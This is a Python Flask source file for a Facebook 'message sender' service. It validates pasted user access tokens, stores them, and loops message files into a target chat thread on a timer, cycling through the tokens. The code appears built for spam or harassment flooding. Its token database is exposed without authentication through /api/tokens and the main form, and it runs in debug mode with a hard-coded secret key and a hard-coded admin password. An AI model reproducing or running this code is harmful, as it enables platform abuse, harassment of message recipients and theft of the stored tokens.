from flask import Flask, request, session, redirect, url_for, render_template, jsonify, flash
import requests
from threading import Thread, Event
import time
import os
import logging
from sqlalchemy import create_engine, Column, Integer, String, Text, DateTime, Boolean, JSON
from sqlalchemy.orm import sessionmaker, declarative_base
from datetime import datetime
import json
import uuid
import re

app = Flask(__name__)
app.debug = True
app.secret_key = "3a4f82d59c6e4f0a8e912a5d1f7c3b2e6f9a8d4c5b7e1d1a4c"

# Database setup
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_NAME = "tasks.db"
engine = create_engine(f'sqlite:///{os.path.join(BASE_DIR, DB_NAME)}?check_same_thread=False')
Base = declarative_base()

# Database Models
class Task(Base):
    __tablename__ = 'tasks'
    id = Column(String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    thread_id = Column(String(50), nullable=False)
    prefix = Column(String(255))
    interval = Column(Integer)
    messages = Column(Text)
    tokens = Column(Text)
    status = Column(String(20), default='Running')
    messages_sent = Column(Integer, default=0)
    messages_failed = Column(Integer, default=0)
    start_time = Column(DateTime, default=datetime.utcnow)
    user_id = Column(String(100), default='default_user')
    stats = Column(JSON, default=lambda: {
        'success_count': 0,
        'fail_count': 0,
        'token_stats': {},
        'last_error': None
    })
    
    def __repr__(self):
        return f"<Task(id={self.id}, status='{self.status}', thread_id='{self.thread_id}')>"

class ValidToken(Base):
    __tablename__ = 'valid_tokens'
    id = Column(Integer, primary_key=True, autoincrement=True)
    token = Column(String(500), nullable=False, unique=True)
    added_date = Column(DateTime, default=datetime.utcnow)
    last_used = Column(DateTime, default=datetime.utcnow)
    usage_count = Column(Integer, default=0)

Base.metadata.create_all(engine)
Session = sessionmaker(bind=engine)

running_tasks = {}
task_lock = Event()

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# ------------------ HELPER FUNCTIONS ------------------
def validate_token(token):
    """Validate if a Facebook token is working"""
    try:
        # Simple check by accessing basic graph API
        response = requests.get(f'https://graph.facebook.com/v15.0/me?access_token={token}', timeout=10)
        return response.status_code == 200
    except:
        return False

def save_valid_token(token):
    """Save a valid token to database"""
    db_session = Session()
    try:
        # Check if token already exists
        existing = db_session.query(ValidToken).filter_by(token=token).first()
        if existing:
            existing.last_used = datetime.utcnow()
            existing.usage_count += 1
        else:
            new_token = ValidToken(token=token)
            db_session.add(new_token)
        db_session.commit()
    except Exception as e:
        logging.error(f"Error saving token: {e}")
        db_session.rollback()
    finally:
        db_session.close()

def get_valid_tokens():
    """Get all valid tokens from database"""
    db_session = Session()
    try:
        tokens = db_session.query(ValidToken).order_by(ValidToken.last_used.desc()).all()
        return [token.token for token in tokens]
    finally:
        db_session.close()

def extract_post_id_from_url(url):
    """Extract post ID from Facebook URL"""
    try:
        # Handle different Facebook URL formats
        patterns = [
            r'facebook\.com/.+/posts/(\d+)',
            r'facebook\.com/photo\.php\?fbid=(\d+)',
            r'facebook\.com/.+/activity/(\d+)',
            r'facebook\.com/.+/videos/(\d+)',
            r'fbid=(\d+)'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, url)
            if match:
                return match.group(1)
        
        # If no pattern matched, try to extract numbers from URL
        numbers = re.findall(r'\d+', url)
        if numbers:
            return numbers[-1]  # Return the last number found
            
        return None
    except Exception as e:
        logging.error(f"Error extracting post ID: {e}")
        return None

def get_page_token(user_token):
    """Get page token from user token"""
    try:
        # First get user's pages
        pages_url = f'https://graph.facebook.com/v15.0/me/accounts?access_token={user_token}'
        response = requests.get(pages_url, timeout=10)
        
        if response.status_code == 200:
            pages_data = response.json()
            if 'data' in pages_data and len(pages_data['data']) > 0:
                # Return the first page's access token
                return pages_data['data'][0]['access_token']
        
        return None
    except Exception as e:
        logging.error(f"Error getting page token: {e}")
        return None

# ------------------ PING ------------------
@app.route('/ping', methods=['GET'])
def ping():
    return "✅ I am alive!", 200

# ------------------ MESSAGE SENDER ------------------
def send_messages(task_id, stop_event, pause_event):
    db_session = Session()
    task = db_session.query(Task).filter_by(id=task_id).first()
    
    if not task:
        db_session.close()
        return

    tokens = json.loads(task.tokens)
    messages = json.loads(task.messages)
    headers = {'Content-Type': 'application/json'}
    
    # Initialize stats if not present
    if not task.stats:
        task.stats = {
            'success_count': 0,
            'fail_count': 0,
            'token_stats': {},
            'last_error': None
        }
    
    # Filter out invalid tokens and save valid ones
    valid_tokens = []
    for token in tokens:
        if validate_token(token):
            valid_tokens.append(token)
            save_valid_token(token)
        else:
            logging.warning(f"Invalid token skipped: {token[:20]}...")
    
    if not valid_tokens:
        logging.error(f"No valid tokens for Task ID: {task.id}")
        task.status = 'Stopped'
        task.stats['last_error'] = 'No valid tokens available'
        db_session.commit()
        db_session.close()
        return

    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue
        
        try:
            for message_content in messages:
                if stop_event.is_set():
                    break
                
                if pause_event.is_set():
                    break
                
                message_sent = False
                for access_token in valid_tokens:
                    if stop_event.is_set() or pause_event.is_set():
                        break
                    
                    api_url = f'https://graph.facebook.com/v15.0/t_{task.thread_id}/'
                    message = f"{task.prefix} {message_content}" if task.prefix else message_content
                    parameters = {'access_token': access_token, 'message': message}
                    
                    try:
                        response = requests.post(api_url, data=parameters, headers=headers, timeout=10)
                        
                        if response.status_code == 200:
                            task.messages_sent += 1
                            task.stats['success_count'] += 1
                            
                            # Update token stats
                            if access_token in task.stats['token_stats']:
                                task.stats['token_stats'][access_token] += 1
                            else:
                                task.stats['token_stats'][access_token] = 1
                                
                            db_session.commit()
                            logging.info(f"✅ Sent: {message[:30]} for Task ID: {task.id}")
                            message_sent = True
                            break  # Move to next message after success
                        else:
                            logging.warning(f"❌ Fail [{response.status_code}]: {message[:30]} for Task ID: {task.id}")
                            task.messages_failed += 1
                            task.stats['fail_count'] += 1
                            task.stats['last_error'] = f"HTTP {response.status_code}"
                    except requests.exceptions.RequestException as e:
                        logging.error(f"⚠️ Network error for Task ID {task.id}: {e}")
                        task.messages_failed += 1
                        task.stats['fail_count'] += 1
                        task.stats['last_error'] = str(e)
                    
                    db_session.commit()
                
                if not message_sent:
                    logging.warning(f"All tokens failed for message: {message_content[:30]}")
                
                if pause_event.is_set():
                    break
                
                time.sleep(task.interval)

        except Exception as e:
            logging.error(f"⚠️ Error in message loop for Task ID {task.id}: {e}")
            task.stats['last_error'] = str(e)
            db_session.rollback()
            time.sleep(10)
    
    db_session.close()

# ------------------ MAIN FORM ------------------
@app.route('/', methods=['GET', 'POST'])
def send_message():
    task_id = None
    if request.method == 'POST':
        access_tokens_str = request.form.get('tokens')
        access_tokens = [t.strip() for t in access_tokens_str.strip().splitlines() if t.strip()]
        
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))
        
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()
        
        db_session = Session()
        try:
            new_task = Task(
                thread_id=thread_id,
                prefix=mn,
                interval=time_interval,
                messages=json.dumps(messages),
                tokens=json.dumps(access_tokens),
                status='Running',
                messages_sent=0,
                messages_failed=0
            )
            db_session.add(new_task)
            db_session.commit()
            task_id = new_task.id
        finally:
            db_session.close()
            
        stop_event = Event()
        pause_event = Event()
        thread = Thread(target=send_messages, args=(task_id, stop_event, pause_event))
        thread.daemon = True
        thread.start()
        
        running_tasks[task_id] = {
            'thread': thread,
            'stop_event': stop_event,
            'pause_event': pause_event
        }
        
    # Get valid tokens for the form
    valid_tokens = get_valid_tokens()
    
    return render_template('index.html', task_id=task_id, valid_tokens=valid_tokens)

# ------------------ USER PANEL ------------------
@app.route('/user/panel')
def user_panel():
    # Get all tasks for the current user (simplified - in a real app you'd have user authentication)
    db_session = Session()
    tasks = db_session.query(Task).all()
    db_session.close()
    
    return render_template('user_panel.html', tasks=tasks)

# ------------------ TASK CONTROL API ENDPOINTS ------------------
@app.route('/api/task/<task_id>/pause', methods=['POST'])
def api_pause_task(task_id):
    if task_id in running_tasks:
        running_tasks[task_id]['pause_event'].set()
        
        db_session = Session()
        task = db_session.query(Task).filter_by(id=task_id).first()
        if task:
            task.status = 'Paused'
            db_session.commit()
        db_session.close()

        logging.info(f"⏸️ Paused task with ID: {task_id}")
        return jsonify({'status': 'success', 'message': 'Task paused'})
    return jsonify({'status': 'error', 'message': 'Task not found'}), 404

@app.route('/api/task/<task_id>/resume', methods=['POST'])
def api_resume_task(task_id):
    if task_id in running_tasks:
        running_tasks[task_id]['pause_event'].clear()
        
        db_session = Session()
        task = db_session.query(Task).filter_by(id=task_id).first()
        if task:
            task.status = 'Running'
            db_session.commit()
        db_session.close()

        logging.info(f"▶️ Resumed task with ID: {task_id}")
        return jsonify({'status': 'success', 'message': 'Task resumed'})
    return jsonify({'status': 'error', 'message': 'Task not found'}), 404

@app.route('/api/task/<task_id>/stop', methods=['POST'])
def api_stop_task(task_id):
    if task_id in running_tasks:
        running_tasks[task_id]['stop_event'].set()
        
        db_session = Session()
        task = db_session.query(Task).filter_by(id=task_id).first()
        if task:
            task.status = 'Stopped'
            db_session.commit()
        
        del running_tasks[task_id]
        db_session.close()

        logging.info(f"🛑 Stopped task with ID: {task_id}")
        return jsonify({'status': 'success', 'message': 'Task stopped'})
    
    # Check if task exists in DB but not in running tasks
    db_session = Session()
    task = db_session.query(Task).filter_by(id=task_id).first()
    if task:
        task.status = 'Stopped'
        db_session.commit()
        db_session.close()
        return jsonify({'status': 'success', 'message': 'Task status updated to stopped'})
    
    return jsonify({'status': 'error', 'message': 'Task not found'}), 404

@app.route('/api/task/<task_id>/stats', methods=['GET'])
def api_task_stats(task_id):
    db_session = Session()
    task = db_session.query(Task).filter_by(id=task_id).first()
    if not task:
        db_session.close()
        return jsonify({'status': 'error', 'message': 'Task not found'}), 404
    
    stats = {
        'id': task.id,
        'status': task.status,
        'messages_sent': task.messages_sent,
        'messages_failed': task.messages_failed,
        'start_time': task.start_time.isoformat() if task.start_time else None,
        'stats': task.stats or {}
    }
    
    db_session.close()
    return jsonify({'status': 'success', 'data': stats})

@app.route('/api/task/<task_id>/details', methods=['GET'])
def api_task_details(task_id):
    db_session = Session()
    task = db_session.query(Task).filter_by(id=task_id).first()
    if not task:
        db_session.close()
        return jsonify({'status': 'error', 'message': 'Task not found'}), 404
    
    task_data = {
        'id': task.id,
        'thread_id': task.thread_id,
        'prefix': task.prefix,
        'status': task.status,
        'messages_sent': task.messages_sent,
        'messages_failed': task.messages_failed,
        'interval': task.interval,
        'start_time': task.start_time.isoformat() if task.start_time else None,
        'stats': task.stats or {}
    }
    
    db_session.close()
    return jsonify({'status': 'success', 'data': task_data})

# ------------------ TOKEN MANAGEMENT API ------------------
@app.route('/api/tokens', methods=['GET'])
def api_get_tokens():
    tokens = get_valid_tokens()
    return jsonify({'status': 'success', 'tokens': tokens})

@app.route('/api/token/validate', methods=['POST'])
def api_validate_token():
    token = request.json.get('token')
    if not token:
        return jsonify({'status': 'error', 'message': 'Token not provided'}), 400
    
    is_valid = validate_token(token)
    if is_valid:
        save_valid_token(token)
        return jsonify({'status': 'success', 'valid': True, 'message': 'Token is valid'})
    else:
        return jsonify({'status': 'success', 'valid': False, 'message': 'Token is invalid'})

@app.route('/api/token/page', methods=['POST'])
def api_get_page_token():
    user_token = request.json.get('token')
    if not user_token:
        return jsonify({'status': 'error', 'message': 'Token not provided'}), 400
    
    # First validate the token
    if not validate_token(user_token):
        return jsonify({'status': 'error', 'message': 'Invalid user token'}), 400
    
    page_token = get_page_token(user_token)
    if page_token:
        save_valid_token(page_token)
        return jsonify({'status': 'success', 'page_token': page_token})
    else:
        return jsonify({'status': 'error', 'message': 'Failed to get page token or no pages found'})

# ------------------ POST ID EXTRACTION API ------------------
@app.route('/api/post/extract-id', methods=['POST'])
def api_extract_post_id():
    post_url = request.json.get('url')
    if not post_url:
        return jsonify({'status': 'error', 'message': 'URL not provided'}), 400
    
    post_id = extract_post_id_from_url(post_url)
    if post_id:
        return jsonify({'status': 'success', 'post_id': post_id})
    else:
        return jsonify({'status': 'error', 'message': 'Could not extract post ID from URL'})

# ------------------ ADMIN PANEL ------------------
@app.route('/admin/panel')
def admin_panel():
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    
    db_session = Session()
    tasks = db_session.query(Task).all()
    valid_tokens = db_session.query(ValidToken).order_by(ValidToken.last_used.desc()).all()
    db_session.close()

    total_messages_sent = sum(task.messages_sent for task in tasks)
    total_messages_failed = sum(task.messages_failed for task in tasks)
    active_threads = sum(1 for task in tasks if task.status == 'Running')

    return render_template('admin.html', 
                         tasks=tasks, 
                         total_messages_sent=total_messages_sent,
                         total_messages_failed=total_messages_failed,
                         active_threads=active_threads,
                         valid_tokens=valid_tokens)

# ------------------ STOP/PAUSE/RESUME LOGIC ------------------
@app.route('/stop_task', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if not task_id:
        return redirect(url_for('send_message'))

    db_session = Session()
    task = db_session.query(Task).filter_by(id=task_id).first()

    if task and task.status != 'Stopped':
        if task_id in running_tasks:
            running_tasks[task_id]['stop_event'].set()
            del running_tasks[task_id]
        
        task.status = 'Stopped'
        db_session.commit()
        logging.info(f"✅ Stopped and saved Task ID: {task_id}")

    elif task and task.status == 'Stopped':
        db_session.delete(task)
        db_session.commit()
        logging.info(f"🗑️ Removed stopped Task ID: {task_id}")

    db_session.close()
    return redirect(url_for('send_message'))

@app.route('/pause_task/<string:task_id>', methods=['POST'])
def pause_task(task_id):
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    
    if task_id in running_tasks:
        running_tasks[task_id]['pause_event'].set()
        
        db_session = Session()
        task = db_session.query(Task).filter_by(id=task_id).first()
        task.status = 'Paused'
        db_session.commit()
        db_session.close()

        logging.info(f"⏸️ Paused task with ID: {task_id}")
    return redirect(url_for('admin_panel'))

@app.route('/resume_task/<string:task_id>', methods=['POST'])
def resume_task(task_id):
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    
    if task_id in running_tasks:
        running_tasks[task_id]['pause_event'].clear()
        
        db_session = Session()
        task = db_session.query(Task).filter_by(id=task_id).first()
        task.status = 'Running'
        db_session.commit()
        db_session.close()

        logging.info(f"▶️ Resumed task with ID: {task_id}")
    return redirect(url_for('admin_panel'))

# ------------------ ADMIN LOGIN & LOGOUT ------------------
@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == "AXSHU143":
            session['admin'] = True
            return redirect(url_for('admin_panel'))
    return render_template('login.html')

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin', None)
    return redirect(url_for('admin_login'))

# ------------------ RUN APP ------------------
def run_all_tasks_from_db():
    db_session = Session()
    tasks_from_db = db_session.query(Task).filter_by(status='Running').all()
    
    for task in tasks_from_db:
        stop_event = Event()
        pause_event = Event()
        
        thread = Thread(target=send_messages, args=(task.id, stop_event, pause_event))
        thread.daemon = True
        thread.start()
        
        running_tasks[task.id] = {
            'thread': thread,
            'stop_event': stop_event,
            'pause_event': pause_event
        }
        logging.info(f"✅ Resuming Task ID {task.id} from database.")
    
    db_session.close()

if __name__ == '__main__':
    run_all_tasks_from_db()
    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5000)))
